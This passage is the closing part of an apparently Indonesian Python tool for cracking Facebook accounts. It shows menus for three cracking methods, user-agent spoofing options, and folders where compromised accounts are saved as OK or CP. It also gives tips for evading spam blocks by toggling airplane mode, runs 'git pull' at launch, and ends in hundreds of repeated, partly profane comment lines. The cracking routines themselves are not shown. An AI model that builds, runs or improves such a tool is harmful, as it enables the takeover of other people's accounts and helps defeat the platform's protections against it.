    print('%s[%s3%s] %sHow To Find Target'%(K,P,K,P))
    print('%s[%s4%s] %sHow During Crack Proccess'%(K,P,K,P))
def tutor_crack():
    mlaku('%s[%s1%s] %sApi : Fast Crack, But Spam Blocked'%(K,P,K,P))
    mlaku('%s[%s2%s] %sMbasic : Slow Crack, No Spam Blocked'%(K,P,K,P))
    mlaku('%s[%s3%s] %sFree FB : Super Slow Crack, No Spam Blocked, Result OK Increase'%(K,P,K,P))
    mlaku('%s[%s7%s] %sCrack With Internet Data (No Support Wifi)'%(K,P,K,P))
    mlaku('%s[%s8%s] %sIf Cracking Proccess No Result'%(K,P,K,P))
    mlaku('%s[%s9%s] %sTurn On Airplane Mode (5 Sec)'%(K,P,K,P))
    input('\n%s[ %sBack %s]%s'%(K,P,K,P))
    menu_log()
def var_author():
    mlaku('%s[ %sAuthor & Team Project %s]'%(K,P,K))
    mlaku('%s'%(K))
    mlaku('%s[%s•%s] %sAuthor :'%(K,P,K,P))
    mlaku('%s     • %sAang Ardiansyah-XD'%(K,H))
    mlaku('%s'%(K))
    mlaku('%s[%s•%s] %sTeam Project %sXNX-CODE Team 2021%s :'%(K,P,K,P,K,P))
    mlaku('%s     • %sMr Jeeck X Nano'%(K,H))
    mlaku('%s     • %sNdrii Sans'%(K,H))
    mlaku('%s     • %sJupi Mlehoy'%(K,H))
    mlaku('%s     • %sMboky Bhizer'%(K,H))
    mlaku('%s     • %sNajib-XD (Yuume Tzy)'%(K,H))
    mlaku('%s     • %sFenzz'%(K,H))
    mlaku('%s     • %sGodong Bodin'%(K,H))
    mlaku('%s     • %sEzaSoftBoy'%(K,H))
    mlaku('%s     • %sHikmat'%(K,H))
    mlaku('%s     • %sDenni'%(K,H))
    mlaku('%s     • %sAlpin'%(K,H))
    mlaku('%s     • %sYogz Tzy'%(K,H))
    mlaku('%s     • %sAkhmad'%(K,H))
    mlaku('%s     • %sViko'%(K,H))
    mlaku('%s     • %sOjan Tzy'%(K,H))
    mlaku('%s'%(K))
def var_ugen():
    print("%s[%s1%s] %sMendapatkan User Agent"%(K,P,K,P))
    print("%s[%s2%s] %sGanti User Agent %s[%sManual%s]"%(K,P,K,P,K,O,K))
    print("%s[%s3%s] %sGanti User Agent %s[%sSesuaikan Hp%s]"%(K,P,K,P,K,O,K))
    print("%s[%s4%s] %sHapus User Agent"%(K,P,K,M))
    print("%s[%s5%s] %sCek User Agent"%(K,P,K,P))
    print("%s[%s0%s] %sKembali"%(K,P,K,P))
def start_method():
    print('\n%s[%s1%s] %sMetode Api [Kenceng]'%(K,P,K,P))
    print('%s[%s2%s] %sMetode Mbasic [Mode Santuy]'%(K,P,K,P))
    print('%s[%s3%s] %sMetode Free Fb [Ini Lambat Bego]'%(K,P,K,P))
def started():
    print('\n%s[%s•%s] %sCrack Sedang Berjalan...'%(K,P,K,P))
    print('%s[%s•%s] %sAkun OK Saved In > OK/%s.txt'%(K,P,K,H,tanggal))
    print('%s[%s•%s] %sAkun CP Saved In > CP/%s.txt'%(K,P,K,K,tanggal))
    print('\n%s[%s!%s] %sMode Pesawatkan [5 Detik] Setiap 3 Menit\n'%(K,H,K,P))
def folder():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
    except:pass
if __name__=='__main__':
  os.system('git pull')
  folder()
  menu()
# AangXD_&_LauraCans
#Lo_Kentod!!!!!
#Panglima_Bacot_Brotherhood
#BE_YOURSELF_AND_NEVER_SURENTOD_TERKENTOD_KENTOD_ENTOD!!!!!!!!!!!
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3

#JANGAN_DIGANTI_ANJING !!!!!!!!!!!!!!!!!

#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3
#Aangxd_X_LauraCantik<3